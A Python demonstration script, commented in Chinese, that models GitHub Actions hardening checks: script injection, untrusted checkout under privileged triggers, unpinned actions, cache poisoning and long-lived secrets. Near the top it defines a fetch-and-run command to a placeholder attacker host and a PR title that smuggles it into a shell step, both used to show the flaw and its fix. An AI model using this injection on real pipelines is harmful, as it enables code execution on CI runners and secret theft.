#!/usr/bin/env python3
"""CI 流水线加固：四类可被攻击者利用的写法，以及各自的判据。

依据 GitHub 官方安全加固文档（docs.github.com, Security hardening for GitHub Actions）。
四类问题有一个共同点：**攻击者能控制一部分输入**（PR 标题、分支内容、tag 指向、缓存内容），
而流水线默认信任它们。本 demo 把每一类都做成一个可判定的检查。

1. 脚本注入：把 `${{ github.event.* }}` 直接拼进 `run:` 的 shell 文本
2. 特权触发器 + 检出不受信任代码：`pull_request_target` / `workflow_run`
3. 第三方 action 用 tag 而非完整 commit SHA 固定（tag 可被移动）
4. 缓存/制品投毒：特权工作流共享主分支缓存，job 之间也不隔离
"""

import re
from typing import Dict, List, Tuple

# ------------------------------------------------------------ 1. 脚本注入

DANGEROUS = "curl http://evil.example/x | sh"
# 攻击者把 PR 标题写成这样：`a"; curl ... | sh #`
ATTACKER_TITLE = 'a"; %s #' % DANGEROUS

UNTRUSTED_EXPR = re.compile(r"\$\{\{\s*github\.event\.[^}]+\}\}")


def render_run(template: str, expr_value: str, style: str) -> Tuple[str, Dict[str, str]]:
    """渲染一个 `run:` 步骤。

    style="interpolate"：把表达式**就地替换进脚本文本**（危险）
    style="env"        ：值进入 env，脚本只引用 `$TITLE`（GitHub 推荐写法）
    """
    if style == "interpolate":
        return UNTRUSTED_EXPR.sub(expr_value, template), {}
    if style == "env":
        return UNTRUSTED_EXPR.sub("$TITLE", template), {"TITLE": expr_value}
    raise ValueError("unknown style: %r" % style)


def outside_quotes_contains(script: str, marker: str) -> bool:
    """marker 是否出现在**引号之外**——出现在引号外才会被 shell 当成命令执行。

    按 `"` 切分，偶数下标段即引号外。
    """
    for i, seg in enumerate(script.split('"')):
        if i % 2 == 0 and marker in seg:
            return True
    return False


# ------------------------------------------------------------ 2~4. 流水线 lint

PRIVILEGED_TRIGGERS = {"pull_request_target", "workflow_run"}
# 检出「不受信任代码」的特征：显式指定 PR 头 / fork 分支
UNTRUSTED_REF = re.compile(r"(\$\{\{\s*github\.event\.pull_request\.head)",
                           re.I)
SHA_PIN = re.compile(r"@[0-9a-f]{40}$")


def lint(workflow: dict) -> List[Tuple[str, str, str]]:
    """返回 [(severity, rule_id, 说明)]，severity ∈ CRITICAL/HIGH/MEDIUM。"""
    out: List[Tuple[str, str, str]] = []
    triggers = set(workflow.get("on", []))
    privileged = triggers & PRIVILEGED_TRIGGERS

    for job in workflow.get("jobs", []):
        # R1 脚本注入
        run = job.get("run", "")
        if run and UNTRUSTED_EXPR.search(run):
            out.append(("CRITICAL", "R1-script-injection",
                        "不受信任表达式被拼进 run 脚本文本；改用 env 中间变量或 action 参数"))
        # R2 特权触发器 + 检出不受信任代码
        if privileged and job.get("checkout_ref") and UNTRUSTED_REF.search(job["checkout_ref"]):
            out.append(("CRITICAL", "R2-untrusted-checkout",
                        "特权触发器 %s 检出了 PR 头代码" % sorted(privileged)))
        # R3 缓存投毒：特权工作流与主分支共享同一缓存
        if privileged and job.get("uses_cache"):
            out.append(("HIGH", "R3-cache-poisoning",
                        "特权工作流与其他特权触发器共享主分支缓存，可能被投毒"))
        # R4 权限最小化
        perms = workflow.get("permissions", None)
        if perms in (None, "write-all"):
            out.append(("MEDIUM", "R4-token-permissions",
                        "GITHUB_TOKEN 未做最小权限配置；默认应为只读，按需在 job 上提升"))
        # R5 第三方 action 固定方式
        for act in job.get("actions", []):
            if act.startswith("third-party/") and not SHA_PIN.search(act):
                out.append(("MEDIUM", "R5-unpinned-action",
                            "%s 未固定到完整 commit SHA；tag 可被移动或删除" % act))
        # R6 长期云凭据
        if job.get("long_lived_cloud_secret"):
            out.append(("MEDIUM", "R6-long-lived-secret",
                        "使用长期云凭据；改用 OIDC 换取短期、范围受限的令牌"))
    return out


# ------------------------------------------------- 3. tag 固定 vs SHA 固定

# 模拟 registry：action 仓库的 tag → commit SHA
ACTION_REGISTRY = {
    "third-party/publish@v3": "a1b2c3d4e5f60718293a4b5c6d7e8f9012345678",
}


def resolve_action(ref: str, moved: bool = False) -> str:
    """解析 action 引用到 commit SHA。

    tag 是**可变**的：拿到仓库写权限的人可以把它指向任意 commit。
    完整 commit SHA 目前是「把 action 当不可变版本使用」的唯一方式
    （要伪造需制造 SHA-1 碰撞）。
    """
    if SHA_PIN.search(ref):
        return ref.split("@")[1]
    return ("0000000000000000000000000000000000000bad"
            if moved else ACTION_REGISTRY[ref])


# --------------------------------------------------- 4. 凭据生命周期（OIDC）

def exposure_window(ttl_seconds: int, leak_at: int) -> int:
    """凭据在 leak_at 时刻泄露后，攻击者还能用多久。

    长期 secret 的 ttl 实际上是无穷；OIDC 换来的令牌只有十几分钟。
    """
    return max(0, ttl_seconds - leak_at)


LONG_LIVED_TTL = 10 * 365 * 24 * 3600   # 长期 secret：当作 10 年
OIDC_TTL = 15 * 60                      # OIDC 短期令牌：15 分钟
LEAK_AT = 120                           # 泄露发生在签发后 2 分钟


def demo() -> None:
    tpl = 'echo "PR title: ${{ github.event.pull_request.title }}"'
    print("== 1. 脚本注入 ==")
    for style in ("interpolate", "env"):
        script, env = render_run(tpl, ATTACKER_TITLE, style)
        hit = outside_quotes_contains(script, "curl")
        print("[%s] script=%r env=%s" % (style, script, env))
        print("      攻击载荷出现在引号外（会被执行）: %s" % hit)

    print("\n== 2. action 固定方式 ==")
    ref = "third-party/publish@v3"
    print("tag 解析（正常）: %s" % resolve_action(ref))
    print("tag 解析（被移动）: %s" % resolve_action(ref, moved=True))
    print("SHA 固定不受影响: %s" % resolve_action(
        "third-party/publish@a1b2c3d4e5f60718293a4b5c6d7e8f9012345678"))

    print("\n== 3. 凭据生命周期 ==")
    print("长期 secret 泄露后可用: %d 秒" % exposure_window(LONG_LIVED_TTL, LEAK_AT))
    print("OIDC 令牌泄露后可用:   %d 秒" % exposure_window(OIDC_TTL, LEAK_AT))

    print("\n== 4. 流水线 lint ==")
    for wf in (BAD_WORKFLOW, GOOD_WORKFLOW):
        print("-- %s" % wf["name"])
        for sev, rid, msg in lint(wf):
            print("   %-8s %-24s %s" % (sev, rid, msg))


BAD_WORKFLOW = {
    "name": "bad",
    "on": ["pull_request_target"],
    "permissions": None,
    "jobs": [
        {"run": 'echo "title: ${{ github.event.pull_request.title }}"',
         "checkout_ref": "${{ github.event.pull_request.head.sha }}",
         "uses_cache": True,
         "actions": ["third-party/publish@v3"],
         "long_lived_cloud_secret": True},
    ],
}

GOOD_WORKFLOW = {
    "name": "good",
    "on": ["pull_request"],
    "permissions": {"contents": "read"},
    "jobs": [
        {"run": 'echo "title: $TITLE"',
         "checkout_ref": "",
         "uses_cache": False,
         "actions": ["third-party/publish@a1b2c3d4e5f60718293a4b5c6d7e8f9012345678"],
         "long_lived_cloud_secret": False},
    ],
}


if __name__ == "__main__":
    demo()
